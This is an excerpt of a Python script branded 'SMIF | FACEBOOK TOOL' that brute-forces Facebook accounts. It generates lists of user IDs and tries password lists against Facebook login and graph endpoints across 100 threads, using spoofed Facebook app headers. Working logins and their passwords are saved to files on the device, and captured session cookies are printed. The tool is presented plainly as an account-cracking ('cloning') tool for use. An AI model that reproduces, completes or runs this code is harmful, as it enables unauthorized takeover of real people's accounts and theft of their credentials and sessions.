...
def check(session,coki):
    ...
    if len(game)==0:
        ...
        for gm in game:
            print(f"\033[1;97m---\033[1;96m"+gm.replace('huwtn',' xx-code=SMIF-33'))
...
for generate in range(100):
	...
	ugen.append(uaku)	
fbks=('[FBAN/Orca-Android;FBAV/35.0.0.4135;FBBV/4471527;[FBAN/Orca-Android;FBAV/203.0.0.16.293;FBBV/137424444;FBDM/{density=2.0,width=720,height=1360};FBLC/en_US;FBCR/Aircel;FBMF/Volvo;FBBD/volvo;FBPN/com.facebook.orca;FBDV/Volvo;FBSV/4;nullFBCA/arm64-v8a:;]')
import requests
rs = requests.get
##Logo##
A = '\x1b[1;97m' 
...
faltu = "\033[1;41m"
pvt = "\033[1;0m"
sys.stdout.write('\x1b]2; SMIF | FACEBOOK TOOL\x07')
def logo():
    os.system('clear')
    print(f"""\033[1;32m
 $$$$$$\  $$\      $$\ $$$$$$\ $$$$$$$$\ 
...
\033[38;5;99m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
{green}[{white}={green}] {yellow}Owner    {green}: ALEXANDER URLUV
{green}[{white}={green}] {yellow}Tools    {green}: FILE CLONING & RANDOM CLONING
{green}[{white}={green}] {yellow}Version  {green}: 0.2
\033[38;5;99m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━""")
def linex():
...
def main():
    ...
    print(f"{green}[{white}2{green}] {yellow} WORKING PASSWORD")
    print(f"{green}[{white}3{green}] {yellow} RANDOM CLONING")
...
def method():
    ...
    os.system("clear")
    logo() 
    print(f'{green}[{white}={green}] {yellow} TOTAL ACCOUNT ID : '+str(len(accounts)))
    print(f'{green}[{white}={green}] {yellow} USE FLIGHT FOR BETTER RESULTS.')
    linex()
    ...
    def start(user):
     try:
        ...
        sys.stdout.write('\r\033[1;92m[\033[1;97mSMIF-M1\033[1;97m]\033[1;92m {}-{} \033[1;97m[\033[1;92m{}\033[1;97m] \033[1;92mOK : \033[1;97m{} \033[1;91mCP : \033[1;97m{}       \r'.format(str(loop), str(len(accounts)), pers , str(len(okacc)) ,str(len(cpacc))))
        sys.stdout.flush()
        for pword in totalpass:              
            ...
            if 'session_key' in response.text:
                okacc.append(acc)
                print('\r\033[1;92m[\033[1;92mSMIF-OK\033[1;92m] \033[1;97m'+acc+' \033[1;93m~\033[1;97m '+pword+'  ')
                open('/sdcard/SMIF-OK.txt','a').write(f'{acc} • {pword}\n')
                if c=='y':
                    try:
                ...
                if cpok=='n':
                     ...
                     print('\r\033[1;91m[\033[1;91mSMIF-CP\033[1;91m] \033[1;97m'+acc+' \033[1;93m~\033[1;97m '+pword+'   ')
                cpacc.append(acc)
                open('/sdcard/SMIF-CP.txt','a').write(f'{acc} • {pword}\n')
                break
            else:
                continue
        loop += 1
    ...
    def start2(user):
      ...
      try:
        ...
        try:
            ...
            last = first
        pers = str(int(loop)/int(len(accounts)) * 100)[:4]
        sys.stdout.write('\r\033[1;92m[\033[1;97mSMIF-M2\033[1;97m]\033[1;92m {}-{} \033[1;97m[\033[1;92m{}\033[1;97m] \033[1;92mOK : \033[1;97m{} \033[1;91mCP : \033[1;97m{}       \r'.format(str(loop), str(len(accounts)), pers , str(len(okacc)) ,str(len(cpacc))))
        sys.stdout.flush()
        for pword in totalpass:
            heads = fbks
            header = {"Content-Type": "application/x-www-form-accencoded","Host": "graph.facebook.com","User-Agent": heads,"X-FB-Net-HNI": "45204","X-FB-SIM-HNI": "45201","X-FB-Connection-Type": "unknown","X-Tigon-Is-Retry": "False","x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group": "5120","X-FB-Friendly-Name": "ViewerReactionsMutation","X-FB-Request-Analytics-Tags": "graphservice","Accept-Encoding": "gzip, deflate","X-FB-HTTP-Engine": "Liger","X-FB-Client-IP": "True","X-FB-Server-Cluster": "True","x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62","Connection": "Keep-Alive"}
...
def fuck():
    ...
    for nmbr in range(limit):
        ...
        user.append(nmp)
    with ThreadPool(max_workers=100) as smifff:
        os.system('clear')
        logo()
        tl = str(len(user))
        ...
        for guru in user:
            ...
            smifff.submit(rcrack,uid,pwx,tl)
    print('\033[1;32m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
...
def rcrack(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write(f'\r\033[1;31m[%sSMIF\033[1;31m] \033[1;34m\033[1;31m[\033[38;5;195m%s/%s\033[1;31m]\033[1;34m \033[38;5;45mOK-:\033[38;5;46m%s\r'%(bi,loop,tl,len(oks))),
            sys.stdout.flush()
    ...
    'viewport-width': '980',}
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[65:80]
                print(f"\033[38;5;46m[SMIF-OK💚] {uid} • {ps}" '  \n\033[1;33m [💉]\033[1;33mCOOKIE = \033[1;32m'+coki+  ' \n\033[1;33m [🤧] \033[1;32mUA = \033[1;34m'+pro+'  \033[0;97m')
                open('/sdcard/SMIF-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\x1b[38;5;196m[SMIF-CP💔] {uid} • {ps}")
                open('/sdcard/SMIF-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
